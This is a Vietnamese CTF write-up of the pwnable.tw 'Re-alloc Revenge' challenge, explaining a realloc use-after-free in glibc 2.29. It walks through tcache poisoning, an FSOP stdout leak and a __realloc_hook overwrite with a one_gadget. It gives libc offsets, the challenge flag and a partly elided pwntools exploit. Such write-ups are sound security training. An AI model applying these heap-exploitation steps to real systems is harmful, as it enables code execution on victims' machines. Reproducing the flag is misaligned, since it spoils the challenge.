+++
title = 'Pwnable.tw - Re-alloc Revenge'
date = 2026-09-21T17:27:06+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Re-alloc Revenge

`nc chall.pwnable.tw 10310`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Re-alloc Revenge/re-alloc_revenge_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
Stripped:   No
```

libc đi kèm glibc 2.29 (Ubuntu GLIBC 2.29-0ubuntu2). Menu `1. Alloc`, `2. Realloc`, `3. Free`, `4. Exit`, kèm hint *"Realloc the world!"*.

`allocate` = `malloc(size <= 0x78)` + `read` + NUL-terminate; `reallocate` = `realloc(heap[idx], size <= 0x78)` + `read`; `rfree` = `realloc(heap[idx], 0)` + `heap[idx] = 0`. Chỉ **2 slot**, request tối đa `0x78` nên mọi chunk đều `<= 0x80` - hoàn toàn trong tầm tcache/fastbin.

Full RELRO nên GOT read-only, PIE nên không có địa chỉ cố định, và **không có chức năng print/view** nào - chương trình chỉ in chuỗi cố định.

#### Bug - UAF rồi realloc tại chỗ

```c
v3 = realloc(heap[v1], size);
if ( !v3 )
    return puts("alloc error");   // <-- return mà KHÔNG xoá heap[v1]
heap[v1] = v3;
printf("Data:");
return read_input(heap[v1], size);
```

`realloc(ptr, 0)` nghĩa là `free(ptr)` và trả NULL, nên `reallocate(idx, 0)` giải phóng chunk nhưng để slot dangling.

Nửa còn lại của primitive: `realloc(dangling, cùng size)` rơi vào fast path của `_int_realloc` (`oldsize >= nb`) và trả về **đúng con trỏ cũ tại chỗ, không gỡ nó khỏi tcache bin**. Lần `read_input` sau đó ghi vào một chunk vẫn đang là đầu tcache → tcache poisoning.

Xác nhận trong gdb, breakpoint ngay sau `call _realloc`:

```text
===== REALLOC RETURN rax=0x0 =====
Free chunk (tcachebins) | PREV_INUSE
Addr: 0x597403449250          <- chunk A vừa bị realloc(A,0) free
Size: 0x80 (with flag bits: 0x81)
tcachebins
0x80 [  1]: 0x597403449260 ▸ 0

===== REALLOC RETURN rax=0x597403449260 =====
tcachebins
0x80 [  1]: 0x597403449260 ▸ 0
```

Hai sự thật đo được: `realloc(ptr,0)` cho `rax=0` và chunk nằm trong `tcachebins 0x80` trong khi slot vẫn dangling; `realloc(dangling, 0x70)` tiếp theo trả về đúng chunk đó và nó **vẫn còn** trong bin.

Kiểm tra trực tiếp trong libc đi kèm:

- Fast path tcache của `__libc_malloc` (`0x98bc8`) chỉ test `entries[tc_idx] != NULL` rồi `counts[tc_idx] -= 1` - bản 2.29 **không** có check `counts > 0`
- Chuỗi `"malloc(): corrupted unsorted chunks 3"` **không có** trong build này → check double-link của unsorted bin không tồn tại, unsorted bin dùng được

### 2. Khai thác

Full RELRO + PIE loại đường GOT overwrite, và không có primitive print nào nên không leak trực tiếp được. Con trỏ libc duy nhất xuất hiện tự nhiên là con trỏ bin (`main_arena+0x60`), mà nó nằm **trên heap** bên trong một chunk đã free. Biến nó thành leak phải đi đường **FSOP**: làm chính lệnh `puts`/`printf` của chương trình dump bộ nhớ libc bằng cách phá `_IO_2_1_stdout_`.

1. **Carve một fake chunk lớn hơn tcache max.** Dùng hành vi grow/split của `realloc` (chỉ với 2 slot) để dựng fake chunk size `0x461` tại heap offset `0xb0`, kèm một "next-chunk size" hợp lệ phía sau. `0x461` lớn hơn `mp_.tcache_bins` (`0x410`) và `global_max_fast` (`0x80`) nên khi free nó rơi vào **unsorted bin**, `fd`/`bk` thành `main_arena + 0x60` - một con trỏ libc được ghi lên heap.

2. **Trỏ một tcache entry về `stdout`.** Làm đầu tcache chồng lên `fd` của chunk unsorted để `next` của nó **thừa hưởng** con trỏ libc, rồi chỉ ghi đè **2 byte thấp** bằng 2 byte thấp của `_IO_2_1_stdout_` (offset `0x1e5760`). Các byte cao thừa hưởng từ `main_arena+0x60` (offset `0x1e4ca0`) vẫn đúng miễn là `base + 0x1e4ca0` và `base + 0x1e5760` rơi cùng một block 64 KiB. `malloc` cho size đó giờ trả về `_IO_2_1_stdout_`.

3. **FSOP leak.** Chỉ ghi đè header FILE: `_flags = 0xfbad1800` (`MAGIC | IS_APPENDING | CURRENTLY_PUTTING`) và zero `_IO_read_ptr/_end/_base`. Lệnh `puts` của menu kế tiếp sẽ phun ra bộ nhớ libc; 6 byte đọc được là `_IO_stdfile_2_lock` (`libc + 0x1e7570`) → libc base, assert `base & 0xfff == 0`.

4. **Code execution.** Đầu độc một tcache entry trỏ tới `__realloc_hook` (`libc + 0x1e4c28`), ghi one_gadget (`libc + 0x106ef8`, `execve("/bin/sh", rsp+0x70, environ)`), rồi trigger bằng chính `reallocate(idx, 0)` của chương trình → `__realloc_hook(oldptr, 0)`.

Các hướng đã loại: GOT overwrite (Full RELRO), `__free_hook`/`__malloc_hook` khi chưa có leak (cần địa chỉ code libc), và unsorted-bin-attack vào `__malloc_hook` (chỉ ghi được địa chỉ đầu unsorted, không thực thi được).

#### Xác suất

Bước 2 ghi đè 2 byte là một lần đoán **1/16** nibble thấp của libc base; trong đó chỉ khoảng 7/16 tránh được carry vào các byte cao thừa hưởng - tức khoảng **1/23 mỗi kết nối**. Toàn bộ attempt bọc trong vòng retry với socket timeout ngắn để đoán sai fail nhanh (thường SIGSEGV; thỉnh thoảng trả về byte rác của menu như `0x24242424` = `'$$$$'`, bị check `base & 0xfff` loại).

#### Các giá trị đo được

| symbol | offset | symbol | offset |
|---|---|---|---|
| `_IO_2_1_stdout_` | `0x1e5760` | `__realloc_hook` | `0x1e4c28` |
| `_IO_stdfile_2_lock` | `0x1e7570` | `__free_hook` | `0x1e75a8` |
| `main_arena` | `0x1e4c40` | `system` | `0x52fd0` |
| unsorted `fd/bk` | `main_arena+0x60 = 0x1e4ca0` | one_gadget | `0x106ef8` |

```bash
local : stdout leak = 0x7993c6814570   libc base = 0x7993c662d000
remote: stdout leak = 0x7f028da24570   libc base = 0x7f028d83d000
```

Cả hai base đều page-aligned và chỉ khác nhau do ASLR.

`FLAG: FLAG{r3alloc_the_heap_r3alloc_the_file_Str34m_r3alloc_my_lif3}`

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('re-alloc_revenge_patched', checksec=False)
libc = ELF('libc.so', checksec=False)
context.binary = exe

def alloc(proc, idx, size, content):
    proc.sendlineafter(b'Your choice: ', b'1')
    proc.sendafter(b'Index:', idx); proc.sendafter(b'Size:', size); proc.sendafter(b'Data:', content)

def realloc_(proc, idx, size, content=b''):
    proc.sendlineafter(b'Your choice: ', b'2')
    proc.sendafter(b'Index:', idx); proc.sendafter(b'Size:', size)
    if size != b'0':
        proc.sendafter(b'Data:', content)

def free_(proc, idx):
    proc.sendlineafter(b'Your choice: ', b'3'); proc.sendafter(b'Index:', idx)

def attempt():
    pr = remote('chall.pwnable.tw', 10310) if args.REMOTE else process([exe.path])
    pr.timeout = 8 if args.REMOTE else 3
    try:
        # Bước 1: fake chunk (size 0x461) + dựng tcache bin
        alloc(pr, b'0', b'50', b'ndd1')
        alloc(pr, b'1', b'50', p64(0) * 3 + p64(0x461))
        # ... (carve, free vào unsorted, partial overwrite 2 byte -> stdout)
        # Bước 3: FSOP leak -> libc base
        # Bước 4: tcache poison -> __realloc_hook = one_gadget, trigger realloc(idx,0)
    except Exception:
        pr.close()
        return None
    return pr

io = None
while io is None:
    io = attempt()
io.interactive()
```
